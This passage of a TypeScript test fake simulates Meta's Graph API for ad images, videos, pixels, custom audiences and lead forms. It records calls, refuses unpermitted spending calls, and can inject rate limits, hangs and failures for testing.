      if (["adimages", "advideos", "video_ads", "adspixels", "customaudiences"].includes(edge)) { const denied = needs("user", token); if (denied) return denied; }
      if (edge === "adimages") {
        const copy = parseJsonParam(params.copy_from);
        let hash: string;
        if (typeof params.bytes === "string" && params.bytes) hash = createHash("sha256").update(Buffer.from(params.bytes, "base64")).digest("hex").slice(0, 32);
        else if (isObject(copy) && typeof copy.hash === "string") hash = copy.hash;
        else return errorBody(400, { code: 100, message: "(#100) bytes or copy_from is required" });
        images.set(hash, { hash, accountId: head });
        return { status: 200, body: { images: { "image.jpg": { hash, url: `https://scontent.example.com/adimg/${hash}.jpg`, width: 1080, height: 1350 } } } };
      }
      if (edge === "advideos") {
        if (typeof params.file_url !== "string" || !params.file_url.startsWith("https://")) return errorBody(400, { code: 100, message: "(#100) file_url is invalid" });
        const id = nextId();
        videos.set(id, { id, accountId: head, name: String(params.name ?? ""), pollsLeft: videoPolls, polls: 0 });
        return { status: 200, body: { id } };
      }
      if (edge === "video_ads") {
        if (params.upload_phase === "start") {
          const id = nextId();
          videos.set(id, { id, accountId: head, name: "", pollsLeft: videoPolls, polls: 0 });
          return { status: 200, body: { video_id: id, upload_url: `https://rupload.facebook.com/video-ads-upload/v26.0/${id}` } };
        }
        if (params.upload_phase === "finish") return videos.has(String(params.video_id)) ? { status: 200, body: { success: true } } : missing();
        return errorBody(400, { code: 100, message: "(#100) upload_phase is invalid" });
      }
      if (edge === "adspixels") {
        if (typeof params.name !== "string" || !params.name) return errorBody(400, { code: 100, message: "(#100) name is required" });
        const id = nextId();
        pixels.set(id, { id, accountId: head, name: params.name, lastFired: null });
        return { status: 200, body: { id } };
      }
      if (edge === "customaudiences") {
        if (typeof params.name !== "string" || !params.name) return errorBody(400, { code: 100, message: "(#100) name is required" });
        const subtype = typeof params.subtype === "string" ? params.subtype : params.rule !== undefined ? "ENGAGEMENT" : "CUSTOM";
        if (subtype === "CUSTOM" && scenarios.has("audience_terms_2655")) return errorBody(400, AUDIENCE_TERMS_2655);
        if (subtype === "CUSTOM" && scenarios.has("audience_terms_1870090")) return errorBody(400, AUDIENCE_TERMS_1870090);
        const origin = typeof params.origin_audience_id === "string" ? params.origin_audience_id : null;
        if (subtype === "LOOKALIKE" && (!origin || !audiences.has(origin))) return errorBody(400, { code: 100, message: "(#100) origin_audience_id is invalid" });
        const id = nextId();
        audiences.set(id, { id, accountId: head, name: params.name, subtype, rows: 0, sessions: new Set(), deleted: false, originId: origin });
        return { status: 200, body: { id } };
      }
      return null;
    }

    if (head === FAKE_BUSINESS_ID && edge === "adspixels") {
      { const denied = needs("user", token); if (denied) return denied; }
      const id = nextId();
      pixels.set(id, { id, accountId: FAKE_ACT, name: String(params.name ?? "Pixel"), lastFired: null });
      return { status: 200, body: { id } };
    }

    const page = pages.get(head);
    if (page && edge) {
      const denied = needs("page", token, page.id);
      if (denied) return denied;
      if (edge === "page_backed_instagram_accounts") {
        if (page.pageBacked.length === 0) page.pageBacked.push(nextId());
        return { status: 200, body: { id: page.pageBacked[0] } };
      }
      if (edge === "leadgen_forms") {
        if (!page.leadgenTos || scenarios.has("leadgen_terms_missing")) return errorBody(400, LEADGEN_TOS_ERROR);
        const questions = parseJsonParam(params.questions);
        const privacy = parseJsonParam(params.privacy_policy);
        if (typeof params.name !== "string" || !Array.isArray(questions) || questions.length === 0 || questions.length > 15) return errorBody(400, { code: 100, message: "(#100) questions are invalid" });
        if (!isObject(privacy) || typeof privacy.url !== "string") return errorBody(400, { code: 100, message: "(#100) privacy_policy is required" });
        const id = nextId();
        forms.set(id, { id, pageId: page.id, name: params.name, status: "ACTIVE", locale: String(params.locale ?? "en_US"), questions, privacyPolicyUrl: privacy.url, createdTime: base.now().toISOString() });
        return { status: 200, body: { id } };
      }
      return null;
    }

    const form = forms.get(head);
    if (form && edge === "test_leads") {
      const denied = needs("page", token, form.pageId);
      if (denied) return denied;
      const fieldData = parseJsonParam(params.field_data);
      const id = nextId();
      leads.set(id, { id, formId: form.id, createdTime: base.now().toISOString(), fieldData: Array.isArray(fieldData) ? (fieldData as Lead["fieldData"]) : [{ name: "full_name", values: ["<test lead: dummy data for full_name>"] }], isTest: true, platform: "fb", isOrganic: false });
      return { status: 200, body: { id } };
    }

    const aud = audiences.get(head);
    if (aud && (edge === "users" || edge === "usersreplace")) {
      { const denied = needs("user", token); if (denied) return denied; }
      const payload = parseJsonParam(params.payload);
      const session = parseJsonParam(params.session);
      const rows = isObject(payload) && Array.isArray(payload.data) ? payload.data : [];
      if (rows.length > 10_000) return errorBody(400, { code: 100, message: "(#100) Too many users in one request (at most 10000)" });
      const seq = isObject(session) ? `${session.session_id}:${session.batch_seq}` : `none:${nextId()}`;
      // A repeated batch of the same session is counted once (Meta's idempotency per batch_seq).
      if (!aud.sessions.has(seq)) {
        aud.sessions.add(seq);
        aud.rows = edge === "usersreplace" && isObject(session) && Number(session.batch_seq) === 1 ? rows.length : aud.rows + rows.length;
      }
      return { status: 200, body: { audience_id: aud.id, session_id: isObject(session) ? session.session_id : null, num_received: rows.length, num_invalid_entries: 0, invalid_entry_samples: {} } };
    }
    return null;
  }

  // ----- The request pipeline -----

  function parseBody(text: string | null | undefined, contentType: string | undefined): unknown {
    if (text === null || text === undefined || text === "") return undefined;
    if (contentType?.includes("application/json") || text.trim().startsWith("{")) {
      try {
        return JSON.parse(text);
      } catch {
        return text;
      }
    }
    return Object.fromEntries(new URLSearchParams(text).entries());
  }

  /**
   * Answers one request. Recorded, classified, token-checked and scenario-shaped.
   *
   * `remote: true` is for requests that came over HTTP (e2e/fake-meta-server.ts) from the app in another process: the permit in
   * the app's async context cannot be seen here, so no request counts as permitted. Phase 0's sends (RELAYED_OVER_HTTP) are
   * relayed to Phase 0's fake and listed apart; any other spend class is still refused and counted as a violation.
   */
  function respond(req: FakeRequest, opts: { remote?: boolean } = {}): FakeResponse {
    const url = typeof req.url === "string" ? new URL(req.url, "https://graph.facebook.com") : req.url;
    const method = (req.method ?? "GET").toUpperCase();
    const path = url.pathname.replace(VERSION, "").replace(/^\/+|\/+$/g, "");
    const query = Object.fromEntries(url.searchParams.entries());
    const headers = Object.fromEntries(Object.entries(req.headers ?? {}).map(([k, v]) => [k.toLowerCase(), v]));
    const body = parseBody(req.body, headers["content-type"]);
    const auth = headers.authorization ?? "";
    const token = /^Bearer\s+(.+)$/.exec(auth)?.[1] ?? (typeof query.access_token === "string" ? query.access_token : null);
    const c = classify({ method, path, query, body });
    const remote = opts.remote === true;
    const permitted = c.class !== "not_spend" && !remote && currentPermit() !== undefined;
    const relayed = remote && RELAYED_OVER_HTTP.has(c.class);
    const record: PromoteCallRecord = { method, path, pattern: c.pattern, class: c.class, why: c.why, token, tokenKind: kindOf(token), permitted, relayed, status: 0, query, body };
    calls.push(record);
    const params: Json = { ...query, ...(isObject(body) ? body : {}) };
    const done = (r: GraphResult, extra: Record<string, string> = {}): FakeResponse => {
      record.status = r.status;
      return { kind: "response", status: r.status, headers: { "content-type": "application/json", ...usageHeaders(path), ...extra }, body: JSON.stringify(r.body) };
    };

    // A spend class without a permit never reaches the data: the test fails at assertNoSpend().
    if (c.class !== "not_spend" && !permitted && !relayed) return done(errorBody(400, { code: 1, message: `fake-meta-promote: ${c.class} call refused (${c.pattern})` }));
    // The unscoped preview edge is banned (D18).
    if (isUnscopedPreview(path)) return done(errorBody(400, { code: 100, message: "fake-meta-promote: the unscoped preview edge is banned" }));

    const hang = hangs.findIndex((h) => !h.match || h.match.test(path));
    if (hang >= 0) {
      hangs.splice(hang, 1);
      record.status = -1;
      return { kind: "hang" };
    }

    const t = throttles.findIndex((x) => (!x.method || x.method === method) && (!x.match || x.match.test(path)));
    if (t >= 0) {
      const inj = throttles[t];
      if (--inj.left <= 0) throttles.splice(t, 1);
      const regain = inj.regainMinutes ?? 0;
      const message = inj.code === 17 ? "(#17) User request limit reached" : inj.code === 613 ? "(#613) Calls to this api have exceeded the rate limit." : `(#${inj.code}) There have been too many calls.`;
      return done(errorBody(400, { code: inj.code, message, ...(inj.subcode !== undefined ? { error_subcode: inj.subcode } : {}) }), usageHeaders(path, 100, regain));
    }

    const isCreate = method === "POST";
    const f = isCreate ? createFailures.findIndex((x) => !x.match || x.match.test(path)) : -1;
    const failure = f >= 0 ? createFailures.splice(f, 1)[0] : null;

    let result: GraphResult | null;
    try {
      if (failure && failure.apply === false) result = null;
      else result = method === "GET" ? handleGet(path, params, token) : handleWrite(method, path, params, token);
      if (result === null && !(failure && failure.apply === false)) result = base.request(method, path, params);
    } catch (e) {
      if (e instanceof FakeMetaNetworkError) {
        record.status = 0;
        return { kind: "network", applied: e.applied };
      }
      throw e;
    }
    if (failure) {
      if (failure.kind === "network") {
        record.status = 0;
        return { kind: "network", applied: failure.apply !== false };
      }
      return done(errorBody(failure.status ?? 500, { code: 2, message: "An unexpected error has occurred. Please retry your request later." }));
    }
    return done(result as GraphResult);
  }

  /** A fetch() for graph.facebook.com and loopback hosts. Honours the request's abort signal (for hangs). */
  async function fetchImpl(input: string | URL | Request, init?: RequestInit): Promise<Response> {
    const url = new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url);
    if (url.hostname !== "graph.facebook.com" && !LOOPBACK.has(url.hostname)) throw new TypeError(`fake-meta-promote only answers graph.facebook.com and loopback, not ${url.hostname}`);
    const headers: Record<string, string> = {};
    new Headers(init?.headers).forEach((v, k) => (headers[k] = v));
    const body = typeof init?.body === "string" ? init.body : init?.body instanceof URLSearchParams ? init.body.toString() : null;
    const signal = init?.signal ?? null;
    if (signal?.aborted) throw signal.reason ?? new DOMException("aborted", "AbortError");
    const out = respond({ method: init?.method ?? "GET", url, headers, body });
    if (out.kind === "hang") {
      return new Promise<Response>((_, reject) => {
        signal?.addEventListener("abort", () => reject(signal.reason ?? new DOMException("aborted", "AbortError")), { once: true });
      });
    }
    if (out.kind === "network") throw new FakeMetaNetworkError(out.applied);
    return new Response(out.body, { status: out.status, headers: out.headers });
  }

  const spendViolations = () => calls.filter((c) => c.class !== "not_spend" && !c.permitted && !c.relayed);
  const relayedCalls = () => calls.filter((c) => c.relayed);
  const bannedCalls = () => calls.filter((c) => isUnscopedPreview(c.path));

  return {
    base,
    calls,
    fetch: fetchImpl,
    respond,
    pages,
    forms,
    leads,
    audiences,
    videos,
    pixels,
    images,
    reviews,
    creatives,
    addPage,
    userToken,
    pageToken: (pageId = FAKE_PAGE_ID) => pages.get(pageId)?.token ?? "",
    scenario(name: PromoteScenario, on = true) {
      if (on) scenarios.add(name);
      else scenarios.delete(name);
      if (name === "review_feedback") for (const r of REVIEW_SAMPLES) on ? reviews.set(r.id, r) : reviews.delete(r.id);
    },
    scenarios: () => [...scenarios],
    reviewSamples: () => REVIEW_SAMPLES.map((r) => r.id),
    /** The next `times` matching requests are refused with a rate-limit code and usage headers at 100%. */
    throttleNext: (inj: ThrottleInjection) => void throttles.push({ ...inj, left: inj.times ?? 1 }),
    /** The usage every answer reports (percent, and minutes until access returns). */
    setUsage: (pct: number, regainMinutes = 0) => void (usage = { pct, regainMinutes }),
    /** The next matching POST is applied (unless apply is false), then answers 500 or drops the connection. */
    failNextCreate: (f: CreateFailure = {}) => void createFailures.push(f),
    /** The next matching request never answers (until its signal aborts). */
    hangNext: (match?: RegExp) => void hangs.push({ match }),
    /** How many status reads a new video stays in processing. */
    setVideoPolls: (n: number) => void (videoPolls = n),
    addReview: (r: Review) => void reviews.set(r.id, r),
    addCreative: (id: string) => void creatives.add(id),
    /** An audience already on the ad account (default: a customer list with no rows). */
    addAudience: (id: string, a: { subtype?: string; rows?: number; accountId?: string } = {}) =>
      void audiences.set(id, { id, accountId: a.accountId ?? FAKE_ACT, name: `Audience ${id}`, subtype: a.subtype ?? "CUSTOM", rows: a.rows ?? 0, sessions: new Set(), deleted: false, originId: null }),
    /** A video already uploaded, still processing for `polls` more status reads. */
    addVideo: (id: string, polls = 0) => void videos.set(id, { id, accountId: FAKE_ACT, name: "", pollsLeft: polls, polls: 0 }),
    /** A lead form on a Page. */
    addForm: (id: string, pageId = FAKE_PAGE_ID) =>
      void forms.set(id, { id, pageId, name: `Form ${id}`, status: "ACTIVE", locale: "en_US", questions: [{ type: "FULL_NAME" }], privacyPolicyUrl: "https://example.com/privacy", createdTime: "2026-10-01T10:00:00+0000" }),
    spendViolations,
    /** Over HTTP: Phase 0's sends (WhatsApp messages, spending limits) relayed to Phase 0's fake, kept apart from violations. */
    relayedCalls,
    bannedCalls,
    /** Fails the test when a promote call reached a spend class (9.3). */
    assertNoSpend() {
      const v = spendViolations();
      if (v.length) throw new Error(`fake-meta-promote: ${v.length} promote call(s) reached a spend class: ${v.map((c) => `${c.method} ${c.pattern} (${c.class})`).join(", ")}`);
    },
    /** assertNoSpend, plus no call to the unscoped preview edge. */
    assertClean() {
      this.assertNoSpend();
      const b = bannedCalls();
      if (b.length) throw new Error(`fake-meta-promote: ${b.length} call(s) to the unscoped preview edge`);
    },
    reset() {
      calls.length = 0;
      throttles.length = 0;
      createFailures.length = 0;
      hangs.length = 0;
      usage = { pct: 4, regainMinutes: 0 };
      for (const s of [...scenarios]) this.scenario(s, false);
    },
  };
}

export type FakeMetaPromote = ReturnType<typeof createFakeMetaPromote>;
